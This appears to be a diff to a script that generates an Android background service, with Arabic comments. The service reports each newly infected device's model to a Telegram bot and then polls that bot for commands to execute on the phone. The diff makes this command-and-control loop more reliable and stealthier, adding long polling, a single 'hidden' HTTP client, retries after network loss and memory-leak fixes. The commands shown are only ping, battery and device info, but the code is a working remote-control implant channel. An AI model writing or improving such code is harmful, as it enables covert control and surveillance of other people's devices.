@@ -1,7 +1,7 @@
 # إنشاء المجلد إذا لم يكن موجوداً
 mkdir -p app/src/main/java/com/h/core
 
-# إنشاء الملف بالمحتوى المطلوب تماماً
+# إنشاء الملف بالمحتوى المطلوب والمعدل
 cat << 'EOF' > app/src/main/java/com/h/core/CoreService.java
 package com.h.core;
 import android.app.*;
@@ -9,10 +9,11 @@ import android.content.*;
 import android.os.*;
 import org.json.JSONArray;
 import org.json.JSONObject;
+import java.util.concurrent.TimeUnit;
 import okhttp3.*;
 
 public class CoreService extends Service {
-    private Handler handler;
+    private boolean isRunning = true; // للتحكم في حلقة الاستماع
     private long lastUpdateId = 0; // لحفظ آخر أمر وصل
     
     @Override 
@@ -26,41 +27,50 @@ public class CoreService extends Service {
         
         Telegram.sendMessage(this, "✅ جهاز جديد متصل ومستعد لتلقي الأوامر\n" + Build.MANUFACTURER + " " + Build.MODEL);
         
-        handler = new Handler(Looper.getMainLooper());
-        // تشغيل مستمع الأوامر
-        pollTelegramCommands();
+        // تشغيل مستمع الأوامر في مسار خلفي واحد (بدون استهلاك الذاكرة)
+        startPollingThread();
     }
     
-    // دالة سحب الأوامر من البوت
-    private void pollTelegramCommands() {
+    private void startPollingThread() {
         new Thread(() -> {
-            try {
-                OkHttpClient client = new OkHttpClient();
-                Request req = new Request.Builder()
-                    .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1))
-                    .build();
-                Response res = client.newCall(req).execute();
-                if (res.isSuccessful() && res.body() != null) {
-                    String jsonData = res.body().string();
-                    JSONObject obj = new JSONObject(jsonData);
-                    JSONArray result = obj.getJSONArray("result");
-                    
-                    for (int i = 0; i < result.length(); i++) {
-                        JSONObject update = result.getJSONObject(i);
-                        lastUpdateId = update.getLong("update_id");
-                        if (update.has("message")) {
-                            JSONObject message = update.getJSONObject("message");
-                            if (message.has("text")) {
-                                String text = message.getString("text");
-                                handleCommand(text); // إرسال الأمر للتنفيذ
+            // إعداد المتصفح المخفي بمهلة زمنية أطول
+            OkHttpClient client = new OkHttpClient.Builder()
+                .readTimeout(15, TimeUnit.SECONDS) 
+                .build();
+                
+            // حلقة تكرار واحدة لا ترهق المعالج
+            while (isRunning) {
+                try {
+                    // استخدام Long Polling (timeout=10) لرد فوري واستهلاك أقل للبطارية
+                    Request req = new Request.Builder()
+                        .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10")
+                        .build();
+                        
+                    // استخدام try-with-resources لإغلاق الاتصال وتفريغ الذاكرة تلقائياً (إصلاح تسريب الذاكرة)
+                    try (Response res = client.newCall(req).execute()) {
+                        if (res.isSuccessful() && res.body() != null) {
+                            String jsonData = res.body().string();
+                            JSONObject obj = new JSONObject(jsonData);
+                            JSONArray result = obj.getJSONArray("result");
+                            
+                            for (int i = 0; i < result.length(); i++) {
+                                JSONObject update = result.getJSONObject(i);
+                                lastUpdateId = update.getLong("update_id");
+                                if (update.has("message")) {
+                                    JSONObject message = update.getJSONObject("message");
+                                    if (message.has("text")) {
+                                        String text = message.getString("text");
+                                        handleCommand(text); // إرسال الأمر للتنفيذ
+                                    }
+                                }
                             }
                         }
                     }
+                } catch (Exception e) {
+                    // إذا انقطع الإنترنت، انتظر 3 ثوانٍ قبل المحاولة مرة أخرى لتجنب التشنج
+                    try { Thread.sleep(3000); } catch (InterruptedException ignore) {}
                 }
-            } catch (Exception e) {}
-            
-            // إعادة الفحص كل 3 ثواني
-            handler.postDelayed(this::pollTelegramCommands, 3000);
+            }
         }).start();
     }
     
@@ -77,6 +87,12 @@ public class CoreService extends Service {
         } else {
             Telegram.sendMessage(this, "⚠️ أمر غير معروف. الأوامر المتاحة:\n/ping\n/battery\n/info");
         }
+    }
+
+    @Override 
+    public void onDestroy() {
+        super.onDestroy();
+        isRunning = false; // إيقاف الحلقة بأمان عند إغلاق الخدمة
     }
 
     @Override public IBinder onBind(Intent i) { return null; }
